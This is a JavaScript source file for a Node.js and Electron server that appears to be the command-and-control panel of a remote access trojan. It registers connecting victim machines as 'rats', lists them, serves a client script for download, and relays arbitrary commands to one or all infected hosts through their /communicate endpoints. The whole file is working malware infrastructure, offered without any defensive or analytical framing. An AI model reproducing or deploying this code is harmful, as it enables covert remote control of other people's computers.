const express = require("express");
const socket = require("socket.io");
const axios = require("axios").default;
const Pages = require("./pages");
const Core = require("../../core/index");
const path = require("node:path");
const http = require("node:http");
const fs = require("node:fs");
const { ipcMain } = require("electron");

class Server extends Map {

    constructor(port=80) {
        super();

        const app = express();
        const server = http.createServer(app);
        const io = new socket.Server(server);

        const core = new Core();

        app.set("trust proxy", true);
        app.use(express.json());
        app.use(express.urlencoded({ extended: true }));
        app.use(express.static(path.join(process.cwd(), "src", "web")));

        const pages = new Pages();
        
        app.get("/tab/:page", async (req, res) => {
            const page = req.params.page;
            if (!pages.has(page)) return res.redirect("/");
            res.send(fs.readFileSync(pages.get(page), "utf-8"));
        });

        app.get("/download", async (req, res) => {
            res.sendFile(path.join(process.cwd(), "src", "app", "client", "app.js"));
        });

        app.post("/window", async (req, res) => {
            ipcMain.emit("window", req.body);
            res.json({ generated: true });
        });

        app.get("/extension/:extension", async (req, res) => {
            if (!core.has(req.params.extension)) return;
            res.json(core.get(req.params.extension).render());
        });

        app.get("/extensions", async (req, res) => {
            const extensions = Array.from(core.keys());
            const result = [];
            for (const extension of extensions) {
                result.push(core.get(extension).render());
            };
            res.json(result);
        });
        
        app.get("/rats", async (req, res) => {
            const rats = Array.from(this.keys());
            res.json(rats);
        });

        io.on("connection", async (s) => {
            s.on("execute", async (command, r) => {
                if (r) {
                    axios.post(`http://${r}:${this.get(r)}/communicate`, {
                        command: command
                    });

                    return;
                };

                const rats = Array.from(this.keys());
                for (const rat of rats) {
                    axios.post(`http://${rat}:${this.get(rat)}/communicate`, {
                        command: command
                    });
                };
            });
        });

        app.get("/connect/:port", async (req) => {
            this.set(req.ip.replace("::ffff:", ""), parseInt(req.params.port));
            io.emit("refresh");
        });

        server.listen(port);

        this.port = port;
        this.io = io;
    };

};

module.exports = Server;